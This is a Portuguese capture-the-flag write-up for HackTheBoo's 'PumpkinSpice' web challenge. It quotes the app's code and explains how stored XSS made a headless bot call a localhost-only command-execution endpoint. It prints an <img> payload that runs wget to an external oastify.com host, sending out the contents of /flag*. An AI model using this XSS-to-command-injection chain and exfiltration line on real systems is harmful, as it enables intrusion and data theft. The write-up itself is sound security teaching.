---
description: >-
  Chall do HackTheBoo (evento de Halloween do HackTheBox). Desafio resolvido em
  23/10.
---

# PumpkinSpice

Após baixar o arquivo .zip contendo o código da aplicação, acessei ela através do browser. Dentro da aplicação, encontrei apenas um input cuja finalidade não estava clara. Então, comecei a fazer _code review_ para entender melhor como a aplicação funcionava.

<figure><img src=".gitbook/assets/Untitled (1).png" alt=""><figcaption><p>Página principal</p></figcaption></figure>

```python
addresses = []

def start_bot():
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support.ui import WebDriverWait

    host, port = "localhost", 1337
    HOST = f"http://{host}:{port}"

    options = Options()

    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-background-networking")
    options.add_argument("--disable-default-apps")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-sync")
    options.add_argument("--disable-translate")
    options.add_argument("--hide-scrollbars")
    options.add_argument("--metrics-recording-only")
    options.add_argument("--mute-audio")
    options.add_argument("--no-first-run")
    options.add_argument("--dns-prefetch-disable")
    options.add_argument("--safebrowsing-disable-auto-update")
    options.add_argument("--media-cache-size=1")
    options.add_argument("--disk-cache-size=1")
    options.add_argument("--user-agent=HTB/1.0")

    service = Service(executable_path="/usr/bin/chromedriver")
    browser = webdriver.Chrome(service=service, options=options)

    browser.get(f"{HOST}/addresses")
    time.sleep(5)
    browser.quit()

@app.route("/add/address", methods=["POST"])
def add_address():
    address = request.form.get("address")
    
    if not address:
        return render_template("index.html", message="No address provi

    addresses.append(address)
    Thread(target=start_bot,).start()
    return render_template("index.html", message="Address registered")

@app.route("/api/stats", methods=["GET"])
def stats():
    remote_address = request.remote_addr
    if remote_address != "127.0.0.1" and remote_address != "::1":
        return render_template("index.html", message="Only localhost allowed")

    command = request.args.get("command")
    if not command:
        return render_template("index.html", message="No command provided")

    results = subprocess.check_output(command, shell=True, universal_newlines=True)
    return results

```

Analisando o código, ficou evidente o que precisava ser feito. A única rota acessível era o _**`/add/address`**_, todas as outras rotas só podiam ser acessadas por hosts internos. O input que estava na página principal permitia adicionar valores ao _array **`addresses`**_, e assim que esse valor era incrementado, havia um _bot_ que acessava outro _endpoint_ da API para listar todos esses valores através de uma página HTML.

{% code title="payload utilizado" %}
```jsx
<img src="http://127.0.0.1:1337/api/stats?command=wget http://idmf57c856aj9xo3rvteqhjdkzyq4hsjg8.oastify.com/$(cat /flag*)">
```
{% endcode %}

Sabendo que input estava sendo refletido em uma página HTML, testei alguns _payloads_ de XSS que tiveram sucesso. Em seguida, utilizei o _bot_ para acessar o _endpoint_ que estava restrito a acesso interno através da _tag **`<img>`**_, e assim fazendo o _bot_ executar o comando desejado, uma vez que esse _endpoint_ permitia a execução de comandos de forma arbitrária.

<figure><img src=".gitbook/assets/Untitled 1 (1).png" alt=""><figcaption><p>Recebendo flag após o envio do payload final</p></figcaption></figure>
